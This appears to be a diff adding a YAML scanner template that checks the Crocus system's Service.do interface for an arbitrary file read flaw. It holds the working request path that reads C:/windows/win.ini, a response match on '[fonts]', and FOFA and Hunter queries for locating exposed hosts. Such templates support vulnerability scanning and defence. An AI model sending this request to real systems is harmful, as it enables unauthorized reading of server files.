@@ -1,0 +1,15 @@
+name: crocus-fileread        
+rules: 
+  - method: GET    
+    path: /Service.do?Action=Download&Path=C:/windows/win.ini
+    headers:
+    body:                 
+    expression:                        
+      status_code:                  
+      response_header:             
+      response_body: "[fonts]"                        
+detail:                          
+  description: "锐明Crocus系统Service.do接口存在任意文件读取漏洞."
+  search:             
+    fofa: body="inp_verification"
+    鹰图: web.body="inp_verification"
